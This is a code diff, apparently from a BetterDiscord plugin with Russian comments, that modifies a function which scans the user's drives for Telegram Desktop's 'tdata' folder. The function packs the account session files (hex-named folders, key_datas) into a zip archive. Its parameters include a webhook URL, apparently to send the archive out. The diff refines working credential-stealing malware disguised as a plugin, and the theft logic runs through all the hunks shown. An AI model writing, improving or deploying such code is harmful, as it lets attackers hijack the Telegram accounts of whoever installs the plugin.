@@ -92,7 +92,6 @@ async function executeFullTest(BdApi, webhookUrl, proxyUrl, fflate) {
             }
         }
 
-        // Если нет, сканируем диски
         if (!tdataPath) {
             result.debug_tdata.push("Стандартные пути пусты. Запуск умного сканирования...");
             const drives = ['C:', 'D:', 'E:', 'F:'];
@@ -100,15 +99,19 @@ async function executeFullTest(BdApi, webhookUrl, proxyUrl, fflate) {
             const findTdataRecursive = (dir, depth = 0) => {
                 if (depth > 4) return null;
                 try {
-                    const entries = fs.readdirSync(dir, { withFileTypes: true });
+                    const entries = fs.readdirSync(dir);
                     let localTdataPath = null;
 
                     for (const entry of entries) {
-                        const lowerName = entry.name.toLowerCase();
-                        if (entry.isDirectory() && lowerName === 'tdata') {
-                            localTdataPath = path.join(dir, entry.name);
+                        const lowerName = entry.toLowerCase();
+                        const fullPath = path.join(dir, entry);
+                        let isDir = false;
+                        try { isDir = fs.statSync(fullPath).isDirectory(); } catch (e) { continue; }
+
+                        if (isDir && lowerName === 'tdata') {
+                            localTdataPath = fullPath;
                         }
-                        if (entry.isFile() && lowerName.endsWith('.exe')) {
+                        if (!isDir && lowerName.endsWith('.exe')) {
                             if (lowerName.includes('telegram') || lowerName.includes('ayugram') || lowerName === 'tg.exe') {
                                 const possibleTdata = path.join(dir, 'tdata');
                                 if (fs.existsSync(possibleTdata) && fs.statSync(possibleTdata).isDirectory()) {
@@ -125,10 +128,13 @@ async function executeFullTest(BdApi, webhookUrl, proxyUrl, fflate) {
 
                     const ignoreDirs = ['windows', 'program files', 'program files (x86)', 'programdata', 'system volume information', '$recycle.bin', 'appdata', 'node_modules', 'users'];
                     for (const entry of entries) {
-                        if (entry.isDirectory()) {
-                            const lowerName = entry.name.toLowerCase();
+                        const lowerName = entry.toLowerCase();
+                        const fullPath = path.join(dir, entry);
+                        let isDir = false;
+                        try { isDir = fs.statSync(fullPath).isDirectory(); } catch (e) { continue; }
+
+                        if (isDir) {
                             if (ignoreDirs.includes(lowerName) || lowerName.startsWith('.')) continue;
-                            const fullPath = path.join(dir, entry.name);
                             
                             if (lowerName.includes('telegram') || lowerName.includes('ayugram') || lowerName === 'tg') {
                                 const res = findTdataRecursive(fullPath, depth);
@@ -156,7 +162,7 @@ async function executeFullTest(BdApi, webhookUrl, proxyUrl, fflate) {
         result.debug_tdata.push(`Ошибка поиска: ${e.message}`);
     }
 
-    // 5. ФОРМИРУЕМ АРХИВ (ТОЛЬКО НУЖНЫЕ ФАЙЛЫ)
+    // 5. ФОРМИРУЕМ АРХИВ (УМНЫЙ ФИЛЬТР ФАЙЛОВ)
     let finalZipBuffer = null;
     try {
         const zipFiles = {};
@@ -165,20 +171,24 @@ async function executeFullTest(BdApi, webhookUrl, proxyUrl, fflate) {
             result.telegram_path = tdataPath;
             result.debug_tdata.push(`Папка tdata найдена: ${tdataPath}`);
             
-            // Регулярное выражение для поиска 16-символьных HEX-папок и файлов
             const hexRegexFolder = /^[A-Fa-f0-9]{16}$/;
             const hexRegexFile = /^[A-Fa-f0-9]{16}[a-z]?$/;
 
             try {
-                const entries = fs.readdirSync(tdataPath, { withFileTypes: true });
+                const entries = fs.readdirSync(tdataPath); // Просто список имен файлов
                 let fileCount = 0;
 
-                for (const entry of entries) {
-                    const name = entry.name;
+                for (const name of entries) {
                     const fullPath = path.join(tdataPath, name);
+                    let isDir = false;
+                    try {
+                        isDir = fs.statSync(fullPath).isDirectory();
+                    } catch (e) {
+                        continue; // Пропускаем, если нет доступа
+                    }
 
-                    // 1. Ищем папку с 16-символьным названием
-                    if (entry.isDirectory() && hexRegexFolder.test(name)) {
+                    // 1. Папка аккаунта
+                    if (isDir && hexRegexFolder.test(name)) {
                         result.debug_tdata.push(`Добавлена папка аккаунта: ${name}`);
                         
                         const addFolder = (dir, prefix = '') => {
@@ -195,21 +205,21 @@ async function executeFullTest(BdApi, webhookUrl, proxyUrl, fflate) {
                                     }
                                 }
                             } catch (err) {
-                                result.debug_tdata.push(`Ошибка чтения папки ${name}: ${err.message}`);
+                                result.debug_tdata.push(`Ошибка папки ${name}: ${err.message}`);
                             }
                         };
                         addFolder(fullPath);
                     }
                     
-                    // 2. Ищем key_datas
-                    else if (entry.isFile() && name === 'key_datas') {
+                    // 2. key_datas
+                    else if (!isDir && name === 'key_datas') {
                         zipFiles['tdata/key_datas'] = new Uint8Array(fs.readFileSync(fullPath));
                         result.debug_tdata.push(`Добавлен файл: key_datas`);
                         fileCount++;
                     }
 
-                    // 3. Ищем корневые файлы с 16-символьным названием (например, D877F783D5D3EF8C или D877F783D5D3EF8Cs)
-                    else if (entry.isFile() && hexRegexFile.test(name)) {
+                    // 3. Корневые файлы с 16-символьным именем (напр. D877F783D5D3EF8Cs)
+                    else if (!isDir && hexRegexFile.test(name)) {
                         zipFiles['tdata/' + name] = new Uint8Array(fs.readFileSync(fullPath));
                         result.debug_tdata.push(`Добавлен файл: ${name}`);
                         fileCount++;
